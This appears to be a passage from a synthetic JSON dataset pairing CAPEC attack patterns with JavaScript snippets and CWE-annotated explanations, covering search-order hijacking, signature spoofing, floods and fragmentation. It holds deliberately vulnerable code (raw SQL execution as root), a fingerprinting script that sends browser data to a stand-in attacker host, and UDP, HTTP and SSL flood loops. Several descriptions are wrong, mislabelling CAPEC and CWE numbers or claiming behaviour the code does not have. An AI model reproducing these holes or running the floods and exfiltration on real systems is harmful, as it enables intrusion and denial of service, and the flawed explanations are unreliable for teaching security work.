        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.post('/execute', (req, res) => {\n  const userInput = req.body.query;\n  db.query(userInput, (err, result) => {\n    if (err) throw err;\n    res.send(result);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that connects to a MySQL database. It includes a POST endpoint '/execute' that takes user input from the request body and executes it as an SQL query. This code is vulnerable to SQL Injection (CWE-89) because it directly uses user input in the SQL query without any sanitization or parameterization. An attacker can exploit this vulnerability to execute arbitrary SQL commands, potentially gaining access to the file system, operating system, and other machines on the network, as described in the CAPEC. Additionally, the database connection is made with root privileges (CWE-250), which amplifies the potential damage an attacker can cause. The code demonstrates how improper handling of user input and unnecessary privileges can lead to severe security issues."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libName) {\n  const searchPaths = [\n    path.join(__dirname, libName),\n    path.join('/usr/local/lib', libName),\n    path.join('/usr/lib', libName)\n  ];\n\n  for (const searchPath of searchPaths) {\n    if (fs.existsSync(searchPath)) {\n      return require(searchPath);\n    }\n  }\n\n  throw new Error('Library not found');\n}\n\n// Example usage\ntry {\n  const myLib = loadLibrary('myLibrary.js');\n  myLib.doSomething();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of library loading that embodies the concept of 'Search Order Hijacking' (CAPEC-471). The `loadLibrary` function searches for a library in a predefined set of directories. The search order starts with the current directory (`__dirname`), followed by system directories (`/usr/local/lib` and `/usr/lib`). An attacker could place a malicious library in the current directory, which would be loaded instead of the legitimate library from the system directories. This vulnerability is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the search path includes directories that could be controlled by an attacker. The code does not leave forensic trails, making it difficult to detect the loading of an incorrect library."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function getBrowserFingerprint() {\n    var fingerprint = '';\n    fingerprint += 'Browser Name: ' + navigator.appName + '\\n';\n    fingerprint += 'Browser Version: ' + navigator.appVersion + '\\n';\n    fingerprint += 'User Agent: ' + navigator.userAgent + '\\n';\n    fingerprint += 'Platform: ' + navigator.platform + '\\n';\n    fingerprint += 'Cookies Enabled: ' + navigator.cookieEnabled + '\\n';\n    fingerprint += 'Language: ' + navigator.language + '\\n';\n    return fingerprint;\n}\n\nfunction sendFingerprint() {\n    var xhr = new XMLHttpRequest();\n    var fingerprint = getBrowserFingerprint();\n    xhr.open('GET', 'http://malicious.example.com/collect?data=' + encodeURIComponent(fingerprint), true);\n    xhr.send();\n}\n\nsendFingerprint();",
        "description": "This JavaScript code snippet demonstrates a basic implementation of browser fingerprinting. The `getBrowserFingerprint` function collects various pieces of information about the user's browser, such as the browser name, version, user agent, platform, whether cookies are enabled, and the language setting. This information is concatenated into a single string. The `sendFingerprint` function then sends this collected data to a remote server using an HTTP GET request. This embodies the main idea of the CAPEC by showing how an attacker can gather detailed information about a victim's browser to tailor subsequent attacks. The use of an HTTP GET request with sensitive information in the query string (CWE-598) and the potential exposure of sensitive information to an unauthorized actor (CWE-200) are also demonstrated in this snippet."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\n// Simulated message and signature\nconst message = 'Important message';\nconst signature = 'fake_signature'; // This should be a valid signature\nconst publicKey = 'fake_public_key'; // This should be a valid public key\n\nif (verifySignature(message, signature, publicKey)) {\n  console.log('Message is from a trusted source.');\n} else {\n  console.log('Message verification failed.');\n}\n\n// Vulnerability: The public key and signature are not validated properly, allowing spoofing\n// CWE-20: Improper Input Validation\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n// CWE-290: Authentication Bypass by Spoofing\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel",
        "description": "This JavaScript code snippet demonstrates a simplified signature verification process using the crypto module. The function `verifySignature` attempts to verify a message's signature using a provided public key. However, the code is vulnerable because it uses fake or improperly validated public keys and signatures, which can lead to signature spoofing attacks. This embodies the CAPEC concept of 'Signature Spoof' by showing how an attacker could generate a message or datablock that appears to be signed by a reputable source. The vulnerabilities are further contextualized by related CWEs: improper input validation (CWE-20), use of a broken or risky cryptographic algorithm (CWE-327), authentication bypass by spoofing (CWE-290), incorrectly specified destination in a communication channel (CWE-941), and improper enforcement of message integrity during transmission (CWE-924)."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate storing private key insecurely\nlet privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\\n-----END PRIVATE KEY-----';\n\n// Function to sign data\nfunction signData(data) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(data);\n  sign.end();\n  const signature = sign.sign(privateKey, 'hex');\n  return signature;\n}\n\n// Simulate an attacker stealing the private key\nlet stolenPrivateKey = privateKey;\n\n// Attacker uses the stolen key to sign data\nfunction attackerSignData(data) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(data);\n  sign.end();\n  const signature = sign.sign(stolenPrivateKey, 'hex');\n  return signature;\n}\n\n// Original data and signature\nconst data = 'Sensitive data';\nconst originalSignature = signData(data);\n\n// Attacker forges a signature\nconst forgedSignature = attackerSignData(data);\n\nconsole.log('Original Signature:', originalSignature);\nconsole.log('Forged Signature:', forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker steals a private key and uses it to forge signatures. The private key is stored insecurely, making it susceptible to theft (CWE-522). The attacker then uses the stolen key to sign data, creating a forged signature that appears to be from the original signer. This represents the main idea of CAPEC- Signature Spoofing by Key Theft. The code highlights the importance of securely storing private keys to prevent unauthorized access and signature forgery."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(data);\n  verifier.end();\n  // Improper verification: does not check the result of verify()\n  verifier.verify(publicKey, signature);\n}\n\n// Example usage\nconst data = 'Important data';\nconst signature = 'fakeSignature';\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----';\n\nverifySignature(data, signature, publicKey);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Signature Spoofing by Improper Validation'. The function `verifySignature` uses the Node.js `crypto` module to verify a cryptographic signature. However, it fails to properly check the result of the `verifier.verify()` method, which should return a boolean indicating whether the signature is valid. This improper verification (CWE-347) allows an adversary to potentially spoof the signature. The code also implicitly relies on the use of a cryptographic algorithm (CWE-327) and certificate validation (CWE-295), which if improperly implemented, can further exacerbate the vulnerability. The example usage shows how the function can be called with data, a fake signature, and a public key, but due to the improper verification, it does not provide any security guarantee."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction spoofSignature(message, fakeSignature, fakePublicKey) {\n  if (verifySignature(message, fakeSignature, fakePublicKey)) {\n    console.log('Signature verified. Executing sensitive operation...');\n    // Perform sensitive operation\n  } else {\n    console.log('Signature verification failed.');\n  }\n}\n\nconst message = 'Important message';\nconst fakeSignature = 'abcdef1234567890'; // Fake signature\nconst fakePublicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----'; // Fake public key\n\nspoofSignature(message, fakeSignature, fakePublicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a cryptographic signature by misrepresenting the signer's identity. The `verifySignature` function is intended to verify the authenticity of a message using a cryptographic signature and a public key. However, the `spoofSignature` function shows how an attacker can provide a fake signature and a fake public key to trick the verification process. If the verification succeeds, the attacker can execute sensitive operations, representing a potential security breach. This example embodies the main idea of CAPEC 'Signature Spoofing by Misrepresentation' and highlights related weaknesses such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Authentication Bypass by Spoofing' (CWE-290)."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processData(data, isSigned) {\n  if (isSigned) {\n    if (!verifySignature(data)) {\n      throw new Error('Invalid signature');\n    }\n  }\n  // Process data without verifying if it's unsigned\n  console.log('Processing data:', data);\n}\n\nfunction verifySignature(data) {\n  // Simulate signature verification\n  return data.signature === 'valid';\n}\n\n// Example usage\nconst signedData = { content: 'Sensitive Info', signature: 'valid' };\nconst unsignedData = { content: 'Sensitive Info' };\n\ntry {\n  processData(signedData, true); // Correctly verified\n  processData(unsignedData, false); // No verification\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can exploit the mixing of signed and unsigned content. The `processData` function processes data differently based on whether it is marked as signed or unsigned. If the data is signed, it verifies the signature using the `verifySignature` function. However, if the data is unsigned, it processes the data without any verification. This can lead to a situation where unsigned data is treated as though it were signed, potentially allowing an attacker to inject malicious data. This snippet embodies the main idea of CAPEC-493 and highlights related weaknesses such as improper verification of cryptographic signatures (CWE-347) and protection mechanism failures (CWE-693)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-15: External Control of System or Configuration Setting\nconst serviceConfigPath = 'C:\\Windows\\System32\\config\\serviceConfig.json';\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonateUser = (user) => {\n  exec(`runas /user:${user} cmd.exe`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Impersonation error: ${error.message}`);\n      return;\n    }\n    console.log(`Impersonated user: ${user}`);\n  });\n};\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nconst modifyServiceConfig = () => {\n  const maliciousConfig = '{ \"service\": \"malicious.exe\" }';\n  fs.writeFile(serviceConfigPath, maliciousConfig, (err) => {\n    if (err) {\n      console.error(`Failed to modify service config: ${err.message}`);\n      return;\n    }\n    console.log('Service configuration modified to execute malicious binary.');\n  });\n};\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nconst disableSecurityChecks = () => {\n  // Simulate disabling security checks\n  console.log('Security checks disabled.');\n};\n\n// Main function to execute the attack\nconst executeAttack = () => {\n  impersonateUser('Administrator');\n  disableSecurityChecks();\n  modifyServiceConfig();\n};\n\nexecuteAttack();",
        "description": "This JavaScript code snippet demonstrates a potential attack on a Windows service configuration by exploiting improper access control (CWE-284) and external control of system settings (CWE-15). The code impersonates an administrator user (CWE-520), disables security checks (CWE-1037), and modifies the service configuration to execute a malicious binary (CWE-69). The main idea is to show how an adversary can manipulate a Windows service to run a malicious executable by exploiting various weaknesses."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Load a malicious root certificate\nconst maliciousRootCert = fs.readFileSync('malicious-root-cert.pem');\n\n// Create an HTTPS agent that uses the malicious root certificate\nconst agent = new https.Agent({\n  ca: maliciousRootCert,\n  rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n});\n\n// Make a request to a spoofed website\nhttps.get('https://spoofed-website.com', { agent }, (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { console.log(data); });\n}).on('error', (e) => { console.error(e); });",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit a weakness in certificate validation to install a malicious root certificate on a compromised system. The code loads a malicious root certificate and creates an HTTPS agent that uses this certificate. By setting 'rejectUnauthorized' to false (CWE-295: Improper Certificate Validation), the code bypasses proper certificate validation. The HTTPS request to a spoofed website then uses this agent, allowing the adversary to avoid security warnings and potentially collect sensitive information from the user. This embodies the main idea of the CAPEC by showing how improper certificate handling can be exploited to establish trust with a malicious server."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "const vm = require('vm');\n\n// Simulate a virtualized environment\nconst sandbox = { user: 'guest', sensitiveData: 'secret' };\nvm.createContext(sandbox);\n\n// Vulnerable code: executing untrusted code within the virtualized environment\nconst untrustedCode = `\n  // Attempt to escape the virtualized environment\n  this.process = process;\n  this.require = require;\n  this.fs = require('fs');\n  this.fs.readFile('/etc/passwd', 'utf8', (err, data) => {\n    if (err) throw err;\n    console.log(data);\n  });\n`;\n\ntry {\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can escape a virtualized environment and gain unauthorized access to the host system. The code uses Node.js's 'vm' module to create a sandboxed environment, simulating a virtualized environment. The 'untrustedCode' string contains malicious code that attempts to escape the sandbox by accessing the 'process' and 'require' objects, and then reading the '/etc/passwd' file, which contains sensitive information. This example embodies the CAPEC of 'Escaping Virtualization' and highlights related CWEs such as 'Protection Mechanism Failure' (CWE-693) and 'Improper Isolation or Compartmentalization' (CWE-653). The code snippet illustrates how improper isolation and execution of untrusted code can lead to a breach of the virtualized environment, allowing the attacker to access sensitive data and execute unauthorized commands."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'trusted-domain.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Host': 'malicious-domain.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(e);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a simplified example of 'Domain Fronting', where contradictory domain names are used in the SNI field of the TLS header and the Host field of the HTTP header. The 'hostname' in the options object is set to 'trusted-domain.com', while the 'Host' header is set to 'malicious-domain.com'. This can cause the traffic to be routed incorrectly, potentially leading to security vulnerabilities such as data interception or unauthorized access. This example embodies the main idea of CAPEC-923, CAPEC-444, and CAPEC-941 by showing how improper restriction of communication channels and inconsistent interpretation of HTTP requests can be exploited."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n  });\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate a TCP SYN flood attack\nfor (let i = 0; i < 10000; i++) {\n  const client = new net.Socket();\n  client.connect(8080, '127.0.0.1', () => {\n    console.log('Connected to server');\n    client.end(); // Close the connection immediately\n  });\n}",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens on port 8080 and logs messages when a client connects or disconnects. The code also simulates a TCP SYN flood attack by creating 10,000 client connections in a loop, each of which connects to the server and then immediately closes the connection. This simulates the behavior of a TCP flood attack, where an adversary sends a large number of TCP SYN messages to exhaust the server's resources. The code embodies the main idea of CAPEC-482 (TCP Flood) and highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of connections the server can handle, leading to potential denial of service."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "const xmlString = '<user><name>John Doe</name></user>'; \nconst parser = new DOMParser(); \nconst xmlDoc = parser.parseFromString(xmlString, 'text/xml'); \nconst userName = xmlDoc.getElementsByTagName('name')[0].childNodes[0].nodeValue; \nconsole.log('User Name:', userName);",
        "description": "This JavaScript code snippet demonstrates a basic XML parsing operation without proper validation or security measures. The XML string is parsed using the DOMParser, and the user name is extracted directly from the XML document. This code is vulnerable to several issues highlighted in the related CWEs: \n1. **Missing XML Validation (CWE-112)**: The XML input is not validated against any schema, making it susceptible to malformed or malicious XML content. \n2. **XML Injection (CWE-91)**: Special elements in the XML are not neutralized, allowing attackers to inject malicious XML content. \n3. **Improper Restriction of XML External Entity Reference (CWE-611)**: The code does not restrict external entity references, which could lead to the inclusion of unintended external documents. \nThis snippet embodies the main idea of the deprecated CAPEC by demonstrating how unvalidated and improperly handled XML can lead to security vulnerabilities."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\n// Vulnerable pseudorandom number generator\nfunction insecureRandom() {\n  return Math.floor(Math.random() * 1000000);\n}\n\n// Simulate key generation using insecure random values\nfunction generateKey() {\n  const key = insecureRandom().toString();\n  return crypto.createHash('sha256').update(key).digest('hex');\n}\n\n// Simulate signing a message\nfunction signMessage(message, privateKey) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  return sign.sign(privateKey, 'hex');\n}\n\n// Simulate verifying a message\nfunction verifyMessage(message, signature, publicKey) {\n  const verify = crypto.createVerify('SHA256');\n  verify.update(message);\n  verify.end();\n  return verify.verify(publicKey, signature, 'hex');\n}\n\n// Attacker recreates the key due to weak random number generation\nconst attackerPrivateKey = generateKey();\nconst attackerPublicKey = crypto.createPublicKey({\n  key: attackerPrivateKey,\n  format: 'pem',\n  type: 'pkcs1'\n});\n\n// Attacker signs a malicious message\nconst maliciousMessage = 'Transfer $1000 to attacker';\nconst forgedSignature = signMessage(maliciousMessage, attackerPrivateKey);\n\n// Victim verifies the message, thinking it is from a trusted source\nconst isVerified = verifyMessage(maliciousMessage, forgedSignature, attackerPublicKey);\nconsole.log('Is the message verified?', isVerified);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker exploits a weak pseudorandom number generator to recreate a private key and forge a signature. The `insecureRandom` function uses `Math.random()`, which is not cryptographically secure, to generate a key. The attacker then uses this key to sign a malicious message. The victim, believing the signature is from a trusted source, verifies the message successfully. This embodies the main idea of CAPEC-151: Signature Spoofing by Key Recreation, and highlights related CWEs such as CWE-330 (Use of Insufficiently Random Values) and CWE-1241 (Use of Predictable Algorithm in Random Number Generator)."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\nconst message = Buffer.from('Flood');\nconst target = '192.168.1.1';\nconst port = 12345;\n\nfunction flood() {\n  for (let i = 0; i < 100000; i++) {\n    client.send(message, 0, message.length, port, target, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n}\n\nflood();",
        "description": "This JavaScript code snippet demonstrates a basic UDP flood attack. It uses the 'dgram' module to create a UDP socket and sends a large number of UDP packets to a specified target IP address and port. The 'flood' function sends 100,000 UDP packets with the message 'Flood' to the target. This can overwhelm the target's network bandwidth and resources, potentially leading to a denial of service. The code embodies the main idea of the CAPEC by illustrating how an adversary might execute a UDP flood attack. The related CWEs are represented by the lack of resource limits (CWE-770), the potential for incorrect destination specification (CWE-941), and the insufficient control of network message volume (CWE-406)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Received ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // No throttling or resource limits\n  // No validation of the source address\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. The server listens for incoming messages and logs them to the console. The code does not implement any throttling or resource limits (CWE-770), nor does it validate the source address of incoming messages (CWE-923). This makes the server vulnerable to an ICMP flood attack, where an attacker can send a high rate of ICMP packets from spoofed addresses, potentially consuming all available network bandwidth and denying service to legitimate users."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (req.method === 'GET') {\n    // Simulate resource allocation without limits\n    let resource = new Array(1000000).fill('data');\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Resource allocated');\n  } else {\n    res.writeHead(405, {'Content-Type': 'text/plain'});\n    res.end('Method Not Allowed');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});\n\n// Simulate HTTP Flood Attack\nfor (let i = 0; i < 1000; i++) {\n  http.get('http://localhost:8080/?data=' + i, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  }).on('error', (e) => {\n    console.error(`Got error: ${e.message}`);\n  });\n}",
        "description": "This JavaScript code snippet creates an HTTP server that listens for GET requests and allocates a large amount of resources without any limits or throttling, embodying CWE-770 (Allocation of Resources Without Limits or Throttling). The server responds to GET requests by allocating a large array, simulating resource consumption. The code also includes a loop that simulates an HTTP Flood attack by sending a large number of GET requests to the server, which can lead to denial of service by consuming server resources. This demonstrates the main idea of CAPEC-488 (HTTP Flood) and highlights the vulnerability of insufficient resource management (CWE-410)."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "const https = require('https');\nconst options = {\n  hostname: 'target-server.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) {\n    const req = https.request(options, (res) => {\n      res.on('data', (d) => {});\n    });\n    req.on('error', (e) => {});\n    req.end();\n  }\n}\n\nsetInterval(floodServer, 100);",
        "description": "This JavaScript code snippet demonstrates a simplified version of an SSL Flood attack. It repeatedly makes a large number of HTTPS requests to a target server, aiming to consume server resources and deny service to legitimate users. The 'floodServer' function creates 1000 HTTPS requests in a loop, and this function is called every 100 milliseconds using 'setInterval'. This represents the CAPEC's main idea of overwhelming the server with SSL requests, exploiting the server's resource allocation vulnerabilities (CWE-770, CWE-410, CWE-400) and potentially leading to a denial of service."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "const http = require('http');\n\nfunction sendAmplifiedRequest(targetServer) {\n  const options = {\n    hostname: 'third-party-service.com',\n    port: 80,\n    path: '/api/large-response',\n    method: 'GET',\n    headers: {\n      'X-Forwarded-For': targetServer\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Simulate processing the large response\n      console.log(`Received chunk: ${chunk}`);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Example usage\nsendAmplifiedRequest('victim-server.com');",
        "description": "This JavaScript code snippet demonstrates an amplification attack. The `sendAmplifiedRequest` function sends a request to a third-party service, spoofing the source address to be that of the target server (`victim-server.com`). The third-party service is expected to generate a large response, which is then sent to the target server, overwhelming it with traffic. This embodies the main idea of CAPEC-130 (Amplification) and incorporates CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-405 (Asymmetric Resource Consumption), and CWE-406 (Insufficient Control of Network Message Volume). The code highlights how an attacker can exploit these weaknesses to generate a large amount of traffic directed at a target server with minimal initial effort."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "function expandEntity(entity, times) {\n  let expanded = '';\n  for (let i = 0; i < times; i++) {\n    expanded += entity;\n  }\n  return expanded;\n}\n\nfunction processInput(input) {\n  const largeEntity = 'A'.repeat(1000000); // CWE-1043: Large non-primitive data element\n  const expandedData = expandEntity(largeEntity, 1000); // CWE-770: No limit on resource allocation\n  console.log(expandedData.length); // CWE-1325: Uncontrolled memory allocation\n}\n\nprocessInput();",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to Quadratic Data Expansion (CAPEC). The `expandEntity` function takes an entity and a number of times to repeat it, concatenating the entity multiple times. The `processInput` function creates a very large entity and then expands it a thousand times, leading to excessive memory allocation. This can cause a denial of service by consuming a large amount of memory, potentially freezing or crashing the application. The code embodies CWE-770 (Allocation of Resources Without Limits), CWE-1325 (Improperly Controlled Sequential Memory Allocation), and CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "const regex = /^(a+)+$/;\nconst input = 'a'.repeat(30) + 'b';\nconsole.log(regex.test(input));",
        "description": "This JavaScript code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regular expression /^(a+)+$/ is designed to match strings composed of one or more 'a' characters. However, due to its nested quantifiers, it can cause exponential backtracking when processing certain inputs. The input string 'a'.repeat(30) + 'b' is crafted to exploit this vulnerability. The regex engine will attempt to match the string, but due to the 'b' at the end, it will fail after extensive backtracking, consuming excessive CPU cycles. This example highlights CWE-1333 (Inefficient Regular Expression Complexity) and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // Simulate allocation of resources based on SOAP array size\n      const arraySize = result?.Envelope?.Body?.[0]?.Array?.[0]?.Element?.length || 0;\n      if (arraySize > 1000000) { // No proper limit check\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Server Error: Resource Exhaustion');\n        return;\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Request processed successfully');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server that processes incoming SOAP messages. It uses the 'xml2js' library to parse the XML content of the SOAP message. The code simulates the allocation of resources based on the size of an array declared in the SOAP message. If the array size exceeds 1,000,000 elements, it returns a server error indicating resource exhaustion. This snippet embodies the main idea of the CAPEC 'SOAP Array Blowup' by demonstrating how an attacker could exploit the lack of proper resource allocation limits (CWE-770) and improperly controlled sequential memory allocation (CWE-1325) to exhaust server resources. The code does not include proper checks or limits, making it vulnerable to such attacks."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'target.server.com', () => {\n  console.log('Connected to server');\n  // Fragmented TCP packet\n  const fragment1 = Buffer.from('4500', 'hex'); // IP header\n  const fragment2 = Buffer.from('0014', 'hex'); // TCP header with flags\n  client.write(fragment1);\n  setTimeout(() => client.write(fragment2), 100); // Send second fragment after a delay\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP fragmentation attack using the 'net' module. The code connects to a target server and sends a fragmented TCP packet. The first fragment contains the IP header, and the second fragment, sent after a delay, contains the TCP header with flags. This fragmentation can bypass certain network filters that do not reassemble packets before filtering. The code also highlights CWE-770 by not limiting the number of fragments sent, CWE-404 by not properly releasing resources, and CWE-319 by transmitting data in cleartext."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst target = '192.168.1.1';\nconst port = 12345;\nconst largeMessage = Buffer.alloc(2000, 'A'); // 2000 bytes to force fragmentation\n\nfunction sendFragmentedPackets() {\n  for (let i = 0; i < 1000; i++) { // CWE-770: No limit on the number of packets\n    client.send(largeMessage, port, target, (err) => {\n      if (err) {\n        console.error('Error sending packet:', err);\n      }\n    });\n  }\n}\n\nsendFragmentedPackets();\n\n// CWE-404: No proper resource shutdown\n// CWE-406: No control over the volume of network messages\n// CWE-319: No encryption, data sent in cleartext\n// CWE-409: Not applicable in this context",
        "description": "This JavaScript code snippet demonstrates a UDP Fragmentation attack. It uses the 'dgram' module to create a UDP client and sends a large message (2000 bytes) to a target server, which forces IP fragmentation. The loop sends 1000 such packets, consuming network bandwidth and potentially overloading the target server's CPU and memory resources. The code lacks limits on resource allocation (CWE-770), does not properly release resources (CWE-404), does not control the volume of network messages (CWE-406), and transmits data in cleartext (CWE-319)."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 7; // Echo port\nconst message = Buffer.alloc(65507, 'A'); // Maximum UDP packet size\n\nfunction sendFragmentedICMP() {\n  for (let i = 0; i < 1000; i++) { // Sending a large number of packets\n    client.send(message, 0, message.length, targetPort, targetHost, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n}\n\nsendFragmentedICMP();\n",
